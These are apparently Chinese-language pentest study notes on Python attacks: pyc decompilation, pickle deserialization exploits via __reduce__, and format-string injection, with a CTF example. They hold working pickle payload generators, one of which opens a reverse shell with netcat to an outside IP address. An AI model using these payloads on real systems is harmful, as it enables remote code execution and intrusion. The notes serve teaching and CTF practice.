
---
➢ Python-PYC-反编译文件出源码

➢ Python-反序列化-调用链&魔术方法

➢ Python-格式化字符串-类魔术方法引用

# PYC-反编译文件出源码

pyc文件是py文件编译后生成的字节码文件(byte code)，pyc文件经过python解释器最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，一般py文件改变后，都会重新生成pyc文件。

```
真题：http://pan.baidu.com/s/1jGpB8DS

安装：pip install uncompyle6

使用：uncompyle6 -o test.py test.pyc

下载：https://github.com/rocky/python-uncompyle6
```

# 反序列化-调用链-魔术方法

## 各类语言序列化和反序列化函数：

Java： 
```
Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等
```

PHP：
```
 serialize()、 unserialize()
```

## Python：
```
pickle marshal json PyYAML shelve PIL unzip
```

序列化：把类对象转化为字节流或文件

反序列化：将字节流或文件转化为类对象

```
pickle.dump(obj, file) : 将对象序列化后保存到文件

pickle.load(file) : 将文件序列化内容反序列化为对象
```

```
pickle.dumps(obj) : 将对象序列化成字符串格式的字节流

pickle.loads(bytes_obj) : 将字符串字节流反序列化为对象
```

PyYAML yaml.load()

JSON json.loads(s)

marshal

### 魔术方法：

```
reduce() 反序列化时调用

reduce_ex() 反序列化时调用

setstate() 反序列化时调用（类似于php的isset被设置）

getstate() 序列化时调用
```

#### 1、序列化和反序列化演示-test.py

```python
import requests

import pickle

import base64

import os

  

# 反序列化被调用

class exp1(object):

    def __reduce__(self):

        return (eval, ("__import__('os').system('calc')",))

class exp2(object):

    def __reduce_ex__(self, protocol):

        return (eval, ("__import__('os').system('calc')",))

# 序列化被调用

class test(object):

    def __getstate__(self):

        cmd = "calc"  # 命令

        os.system(cmd)

  

# 创建序列化对象

e1 = exp1()

e2=exp2()

e3=test()

# 使用 pickle 序列化对象

s1 = pickle.dumps(e1)

s2=pickle.dumps(e2)

s3=pickle.dumps(e3)

# Base64 编码序列化后的字节串

u1 = base64.b64encode(s1).decode()

u2=base64.b64encode(s2).decode()

print(u1)

print(u2)
```

#### 2、序列化和反序列化形成-test.py

#### 3、序列化和反序列化利用-server.py pop.py
```python
import requests

import pickle

import base64

import os

  
class exp(object):

    def __reduce__(self):

        return (eval, ("__import__('os').system('c:/nc 47.94.236.117 5555 -e cmd')",))

  

# 创建序列化对象

e = exp()

# 使用 pickle 序列化对象

s = pickle.dumps(e)

# Base64 编码序列化后的字节串

user = base64.b64encode(s).decode()

print(user)
```

#### 4、序列化和反序列化测试
赛题-[watevrCTF-2019]Pickle Store

黑盒：Python反序列化特征：base64编码 前面gA固定（序列化数据）

测试：直接提交构造的payload测试

# 格式化字符串-类魔术方法引用

https://xz.aliyun.com/t/3569

第一种：%操作符

第二种：string.Template

第三种：调用format方法 （可控格式化字符串）
```python
config={'flag':'woaichixigua'}

class User(object):

    def __init__(self,name):

        self.name=name

  

user = User('joe')

print('Hello {name}'.format(name='xiaodi'))

print('Hello {name}'.format(name=user.__class__.__init__.__globals__))

print('Hello {name}'.format(name=user.__class__.__init__.__globals__['config']))


#name后面的值可控，我们user.__class__.__init__.__globals__['config']传入进入获取当前脚本的核心flag
```

第四种: f-Strings（可控格式化字符串）

```python

a , b = 5 , 10

f'Five plus ten is {a + b} and not {2 * (a + b)}.'

'Five plus ten is 15 and not 30.'


print(f'{__import__("os").system("ipconfig")}')
```